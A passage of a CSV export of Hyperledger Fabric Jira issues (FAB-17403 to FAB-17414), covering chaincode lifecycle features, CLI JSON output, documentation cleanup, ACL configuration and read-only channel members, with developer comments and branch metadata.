Hope this helps. ",,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwrrq:65jj9",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),pandrejko,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Dynamic Private Data Collections,FAB-17403,44003,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,JulianSheeper,JulianSheeper,16/Jan/20 7:42 PM,19/Apr/20 1:13 PM,28/Oct/23 3:09 AM,19/Apr/20 1:13 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"Currently the Private Data Collections get defined when instantiating the Chaincode using the ""collections-config"" option, e.g. 

_--collections-config ""/opt/gopath/src/github.com/hyperledger/fabric/peer/config/private-data-collections.json""_


 This implies, that you have to reinstantiate the Chaincode every time you make a change to the Private Data Collections Definition.

The goal is to decouple the Private Data Collections from the Chaincode instantiation, so that you can dynamically add, remove and update Private Data Collections without having to reinstantiate the Chaincode.

Therefore, I suggest three new SDK methods:
 * addPrivateDataCollection
 * updatePrivateDataCollection
 * removePrivateDataCollection

 

 ",,denyeart,JulianSheeper,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Yes,Unset,,,,,No,,Unset,No,,,"1|i017t7:",,,,Yes,Unset,,(Please add steps to reproduce),,Yes,,,,,,Unset,,Unset,,(Please add usage information),denyeart,JulianSheeper,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/Apr/20 1:12 PM;denyeart;In v2.0 the chaincode deployment and definition (including collections) are indeed decoupled. Closing.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add Darwin and Windows Binaries to Artifactory,FAB-17404,44004,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,btl5037,btl5037,17/Jan/20 2:47 AM,18/Jan/20 12:52 PM,28/Oct/23 3:09 AM,18/Jan/20 12:52 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,,,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i017tf:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,release-1.4,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Lifecycle CLI omits empty arrays from JSON output,FAB-17405,44005,,Story,Backlog,FAB,Fabric,software,denyeart,,,Low,,xwu,sstone1,sstone1,17/Jan/20 3:10 AM,15/Mar/20 10:59 PM,28/Oct/23 3:09 AM,,v2.0.0,,,,,,,,,,,,,fabric-cli,,,,,,,,,0,ipm,,,,,"When either ""peer lifecycle chaincode queryinstalled -O json"" or ""peer lifecycle chaincode querycommitted -O json"" are called, they output a JSON object that contains the results of the query.

For ""peer lifecycle queryinstalled"", the JSON output is:
{noformat}
{
  ""installed_chaincodes"": [
    { ... chaincode1 ... },
    { ... chaincode2 ... }
   ]
}
{noformat}
However, if the peer has no installed chaincodes, the JSON output is:
{noformat}
{
}
{noformat}
This makes it more difficult to build applications that consume this JSON, as you have to cater for the array ""installed_chaincodes"" potentially being absent. IMO, the array should always be included in the JSON, even it is empty.",,denyeart,sstone1,sykesm,xwu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-11237,,,No,,Unset,No,,,"1|i017tn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,sstone1,sykesm,xwu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"21/Jan/20 7:22 AM;denyeart;[~wlahti] any chance you could take a look? would be nice to get contract changes merged before v2.0.;;;","17/Feb/20 11:20 PM;xwu;For ""peer lifecycle chaincode queryinstalled -O json"", if the peer has no installed chaincodes, the JSON output is:

{noformat}
{
	""installed_chaincodes"": [
	]
}
{noformat}


For ""peer lifecycle chaincode querycommitted --channelID mychannel -O json"", if the peer has no committed chaincodes, the JSON output is

{noformat}
{
	""chaincode_definitions"": [
	]
}
{noformat}
;;;","17/Feb/20 11:36 PM;sykesm;Since there seems to be a flurry of activity on this right now, I guess it's time to comment. While I understand the sentiment behind this, we should not be investing in this.

1. We do not want to be in the business of enhancing and maintaining the peer CLI. The https://github.com/hyperledger/fabric-cli was bootstrapped as a formal hyperledger project to address this need.
2. The reason the JSON response is empty is because when the CLI is told to serialize in JSON, it simply serializes the protos in JSON. It's that simple. There's no logic to massage the output for consumption by humans any more than there is logic to massage the proto ouput for humans.
3. The reason the empty field is omitted is because the protoc compiler explicitly tells the JSON marshaller to omit empty fields.

In summary, I don't think enhancing the commands to add special case logic for one or two empty fields makes any sense. The current implementation simply serializes the proto structs as requested.;;;","17/Feb/20 11:47 PM;xwu;Yeah, the proto compiler omit the empty fields for the “omitempty” attribute.
I turn this issue to ""TO DO"" status, waiting for further discussion.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"As a user, I should be able to query the chaincode definitions that I have approved but not committed",FAB-17406,44006,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,tatsu-sato,sstone1,sstone1,17/Jan/20 3:18 AM,09/Nov/20 11:49 PM,28/Oct/23 3:09 AM,09/Nov/20 11:49 PM,v2.0.0,,,,,,,,,,,,,fabric-cli,,,,,,,,,0,,,,,,"Currently, when you approve a chaincode definition using the new chaincode lifecycle, there is no CLI (or API, AFAIK), that allows you to retrieve all the details of the chaincode definition that I just approved.  

In particular, I am looking to confirm that I have specified the correct package ID in my approval before I attempt to commit it.

""peer lifecycle chaincode checkcommitreadiness"" allows me to confirm that I have specified all of the correct details apart from the package ID.

It would be great if a new CLI command ""peer lifecycle chaincode queryapprovals"" could be introduced that allowed you to retrieve the list of all uncommitted chaincode definitions that you have approved. ",,sstone1,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17401,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-11237,,,No,,Unset,No,,,"1|i017tv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sstone1,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Jan/20 8:02 AM;tatsu-sato;[~sstone1]
I agree with you. I have also submitted a similar issue as follows and I will create a patch for their issues.

[https://jira.hyperledger.org/projects/FAB/issues/FAB-17401];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Handle Private IP's and Shortnames in Fabric-Test Operator,FAB-17407,44009,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,btl5037,btl5037,17/Jan/20 8:05 AM,23/Jan/20 1:14 AM,28/Oct/23 3:09 AM,23/Jan/20 1:14 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,,,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i017uj:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Move writing your first app tutorial to test network,FAB-17408,44010,44479,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,negupta,negupta,negupta,17/Jan/20 11:21 AM,31/Mar/20 3:47 AM,28/Oct/23 3:09 AM,31/Mar/20 3:38 AM,v2.0.0,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,,,negupta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-15354,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i017ur:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),negupta,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"05/Feb/20 6:39 AM;negupta;https://github.com/hyperledger/fabric/pull/522;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
FabCar Fails to Start with Java Chaincode,FAB-17409,44020,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,,btl5037,btl5037,18/Jan/20 6:26 AM,18/Jan/20 7:31 AM,28/Oct/23 3:09 AM,18/Jan/20 7:31 AM,,,,,,,,,,,,,,fabric-samples,,,,,,,,,0,ci-blocker,ci-failure,,,,"When running `./startFabric.sh java` in the fabcar directory on release-1.4, the instantiation of the chaincode fails with the following error 
{noformat}
Error: could not assemble transaction, err proposal response was not successful, error code 500, msg chaincode registration failed: container exited with 1{noformat}
The peer logs contain only the following error:
{code:java}
2020-01-17 21:21:43.342 UTC [endorser] SimulateProposal -> ERRO 06b [mychannel][e569a062] failed to invoke chaincode name:""lscc"" , error: container exited with 12020-01-17 21:21:43.342 UTC [endorser] SimulateProposal -> ERRO 06b [mychannel][e569a062] failed to invoke chaincode name:""lscc"" , error: container exited with 1 github.com/hyperledger/fabric/core/chaincode.(*RuntimeLauncher).Launch.func1 /opt/gopath/src/github.com/hyperledger/fabric/core/chaincode/runtime_launcher.go:63 runtime.goexit 
/opt/go/src/runtime/asm_amd64.s:1337chaincode registration failed
{code}
There is no other information in the logs. It can be easily reproduced by simply running the script 

 ",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i017w3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fabric master docs include references to prior release artifacts,FAB-17410,44021,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,pandrejko,denyeart,denyeart,18/Jan/20 7:53 AM,28/Jan/20 5:15 AM,28/Oct/23 3:09 AM,28/Jan/20 5:15 AM,,,,,,,,,,v2.0.0,,,,fabric-docs,,,,,,,,,0,,,,,,"In /fabric/docs directory, if you grep for release-1.4, release-1.3, release-1.2, release-1.1, you'll find many link references to prior version code or readthedocs.

grep -Irns ""release-1."" *

Where possible these references should be removed.

Where not possible, we need a doc task each release to update the references to the latest release branch (e.g. release-2.0).",,denyeart,joe-alewine,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i017wb:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,joe-alewine,pandrejko,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Jan/20 7:53 AM;denyeart;[~pandrejko] what do you think?;;;","21/Jan/20 2:52 AM;joe-alewine;PR: [https://github.com/hyperledger/fabric/pull/519]

Many of the references to old versions were, according to my own audit, fine. But I updated the ones that seemed necessary to update.;;;","21/Jan/20 6:26 AM;pandrejko;Once we get 
Joe and Nik's PRs merged
PR: https://github.com/hyperledger/fabric/pull/519
PR: https://github.com/hyperledger/fabric/pull/521

I'll make another pass on the doc links. 
;;;","28/Jan/20 5:15 AM;denyeart;https://github.com/hyperledger/fabric/pull/525 - master merged
https://github.com/hyperledger/fabric/pull/566 - release-2.0 merged
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fabric master docs reference old Fabric versions,FAB-17411,44022,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,pandrejko,denyeart,denyeart,18/Jan/20 8:06 AM,21/Jan/20 11:30 AM,28/Oct/23 3:09 AM,21/Jan/20 11:30 AM,,,,,,,,,,v2.0.0,,,,fabric-docs,,,,,,,,,0,,,,,,"There are many doc references in master to prior version such as v1.1 and v1.2 references here:

[https://hyperledger-fabric.readthedocs.io/en/latest/access_control.html#migration-considerations-for-customers-using-the-experimental-acl-feature]

In this case, the content was intended for users upgrading to v1.2. It can be removed in v2.0 doc since we expect users to upgrade one step at a time (e.g. from v1.4 only).

More generally, grepping /fabric/docs/source for v1.1, v1.2, v1.3, v1.4 returns many results. Some can be kept (e.g. when documenting when a feature or capability entered Fabric), but others should likely be removed at the v2.0 boundary.",,denyeart,joe-alewine,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i017wj:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,joe-alewine,pandrejko,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Jan/20 8:06 AM;denyeart;[~pandrejko] FYI;;;","21/Jan/20 2:52 AM;joe-alewine;PR: [https://github.com/hyperledger/fabric/pull/519]

Many of the references to old versions were, according to my own audit, fine. But I updated the ones that seemed necessary to update.;;;","21/Jan/20 6:27 AM;pandrejko;Also Nik fixed the relevant references to instantiate here: PR: https://github.com/hyperledger/fabric/pull/521;;;","21/Jan/20 7:05 AM;denyeart;PR 519 and 521 both merged to master, and cherry picked to release-2.0.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
_lifecycle resources missing from sample configtx.yaml ACL section,FAB-17412,44023,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,denyeart,denyeart,18/Jan/20 8:13 AM,23/Jan/20 3:35 AM,28/Oct/23 3:09 AM,23/Jan/20 2:34 AM,,,,,,,,,,v2.0.0,,,,,,,,,,,,,0,ipm,,,,,"The list of _lifecycle references here:

[https://github.com/hyperledger/fabric/blob/master/core/aclmgmt/resources/resources.go#L13-L23]

is much longer than the list of _lifecycle resources in configtx.yaml:

[https://github.com/hyperledger/fabric/blob/master/sampleconfig/configtx.yaml#L149-L156]

I suspect at least some of these are gaps that need to be corrected.

Also, need to verify that each of the actual _lifecycle functions check the associated ACLs.

And it appears that at least some of the names are outdated.

Finally, what is the default behavior when an ACL is not included in the configtx.yaml? Does it simply mean a policy is not checked, or is there some default policy used? This last question likely needs to be documented.",,denyeart,jyellick,sykesm,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8zls",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,jyellick,sykesm,wlahti,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,release-2.0,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"18/Jan/20 8:15 AM;denyeart;Since [~jyellick] and [~wlahti] have history on this one, I've tagged for ipm to assess.;;;","21/Jan/20 2:47 AM;wlahti;The lists are different because the one in aclmgmt also includes the peer-scoped lifecycle resources that do not reference channel policies. 

 

I'll start by updating configtx.yaml, which does indeed include an outdated resource (QueryNamespaceDefinitions) and is missing one channel-scoped resource (CheckCommitReadiness): [https://github.com/hyperledger/fabric/pull/520];;;","21/Jan/20 3:01 AM;wlahti;In regards to your final question: when a policy is not included in configtx.yaml, the peer will use the default policy as specified by the default ACL provider: [https://github.com/hyperledger/fabric/blob/master/core/aclmgmt/defaultaclprovider.go#L43];;;","22/Jan/20 1:23 AM;sykesm;[~jyellick] - Please see https://github.com/hyperledger/fabric/pull/520/files#r368741652 for the final call on accuracy vs. expected use case semantics. The updates match what exists in the code so the existing changes do deliver what was requested.

If we need a change, we should open another issue.

Thanks.;;;","23/Jan/20 2:35 AM;denyeart;PR merged in master and release-2.0. Closed the Jira, if [~jyellick] sees anything else missing we can open a subsequent Jira.;;;","23/Jan/20 3:35 AM;jyellick;Looks fine to me.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Support for read-only channel members in new lifecycle,FAB-17413,44024,,Bug,Unverified,FAB,Fabric,software,denyeart,,,Medium,,,denyeart,denyeart,18/Jan/20 8:39 AM,10/Nov/20 12:16 AM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-peer,,,,,,,,,0,,,,,,"To support channel members with read-only privilege (e.g. query chaincode but not submit transactions), you can simply exclude the org from the coarse */Channel/Writers* policy so that they can't submit transactions to ordering service:
[https://github.com/hyperledger/fabric/blob/release-1.4/sampleconfig/configtx.yaml#L414-L416|https://urldefense.proofpoint.com/v2/url?u=https-3A__github.com_hyperledger_fabric_blob_release-2D1.4_sampleconfig_configtx.yaml-23L414-2DL416&d=DwMFAg&c=jf_iaSHvJObTbx-siA1ZOg&r=FWiwMUSIAq7Ii1KJX8rdZWEsrplZzcrGwWreBa-fmbA&m=DsnpLm0yOBP2JBmkZnxv92Mk-v3x-BhOEd1s5O_7Z18&s=JSmsduYlme0fhuevPOKhveN2jRBZxbbpBH9b0wVZZ_Y&e=]

and change *peer/Propose* fine-grained ACL to */Channel/Application/Readers* so that they can invoke chaincode:
[https://github.com/hyperledger/fabric/blob/release-1.4/sampleconfig/configtx.yaml#L211|https://urldefense.proofpoint.com/v2/url?u=https-3A__github.com_hyperledger_fabric_blob_release-2D1.4_sampleconfig_configtx.yaml-23L211&d=DwMFAg&c=jf_iaSHvJObTbx-siA1ZOg&r=FWiwMUSIAq7Ii1KJX8rdZWEsrplZzcrGwWreBa-fmbA&m=DsnpLm0yOBP2JBmkZnxv92Mk-v3x-BhOEd1s5O_7Z18&s=FDsCjpgdR6vRmPn3CwRMG82aU6_7S3wkYdLw3HCbTME&e=]

 

At least, you could do this in v1.4.  With the v2.0 lifecycle however, in order to query a chaincode, your org must install the chaincode AND ApproveForMyOrg on the chaincode definition. However, a read-only member has no privilege to submit the _lifecycle ApproveForMyOrg transaction to the channel ordering service, and therefore they are not able to query the chaincode.  If you attempt to query chaincode, you will receive error:
{code:java}
chaincode definition for 'marbles' at sequence 1 on channel 'mychannel' has not yet been approved by this org{code}
 

If an org has not yet agreed to the chaincode definition, it seems that their peer's endorsements should not be counted towards the endorsement policy for a valid transaction, but it seems that they should be able to query their own local chaincode.  Otherwise, I don't know how we'll support read-only channel members that are not able to submit the ApproveForMyOrg transaction.

 

 ",,denyeart,jyellick,mirioeggmann,yacovm,ymlbright,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb0zyzx",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,jyellick,mirioeggmann,yacovm,ymlbright,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Jan/20 8:41 AM;denyeart;[~jyellick] [~ales] What do you think?;;;","23/Jan/20 3:35 AM;jyellick;This is a bit of a tricky one. Lifecycle v2.0 chose to use implicit collections to indicate agreement to execute a chaincode. This closes what is arguably a security problem in the v1.x lifecycle, in that if your peer had a chaincode installed, but you did not want your peer to run that chaincode on a channel, there was essentially no (good) way to prevent it.

I agree with the mechanics of what you outlined above, as a way to completely exclude an org from having the ability to submit transactions, but really, it's hard to claim the org is a part of the channel if it cannot transact in any way. For instance, what if the org wants to revoke one of its user certificates? In this case, you must have configured the org's MSP definition (and therefore identity/membership) to be controlled by another org. If that's the case, where is the utility in encoding them as their own org? If another org is handling their administration, then why not let that org hold the admin certificate keys?

Assuming that's the route you want to go, then it's relatively simple to instead of entirely denying this org write permissions on the channel, to instead restrict this org's write ability to its admin users. This accomplishes the same goal – standard org users cannot transact – and only the admins of this org (which the org doesn't actually own) can.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"As a chaincode author, I need JSON serialized deterministically",FAB-17414,44025,,Documentation,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,denyeart,denyeart,18/Jan/20 12:51 PM,23/Apr/21 8:58 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-docs,fabric-samples,,,,,,,,0,,,,,,"Given the prevalence of JSON in user chaincode, and the criticality of deterministic serialization when saving state in chaincode, users need guidance around deterministic JSON serialization. This is especially true in v2.0 since chaincode may be different across peers, perhaps even implemented in different languages.

